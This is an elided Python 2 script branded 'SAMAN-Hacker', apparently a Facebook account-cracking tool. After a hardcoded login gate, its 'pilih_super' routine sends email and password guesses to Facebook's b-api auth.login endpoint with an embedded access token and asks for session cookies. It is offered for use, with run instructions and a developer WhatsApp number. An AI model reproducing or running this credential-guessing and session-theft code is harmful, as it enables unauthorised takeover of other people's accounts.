...
#The Credit For This Code Goes To samanhacker
...
CorrectUsername = "saman"

CorrectPassword = "Good1088"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            print "Logged in successfully as " + username #Dev:saman_hacker
...
def menu():
	...
	os.system("clear") #Dev:saman_hacker
...
def pilih_super():
	...
	def main(arg):
		...
		try:
			...
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&si=3f555f99fb61fcd7aa0c44f58f522ef6")
	...
	print "  \033[1;93m«---•◈•---Developed By SAMAN-Hacker--•◈•---»" #Dev:Baloch_hacker

	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Saman.py)↩\033[1;97m....'
...
: \033[1;96m ....LOVESAMANHACKER....... \033[1;93m :

•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                WhatsApp Num

              \033[1;96m +923026595112"""
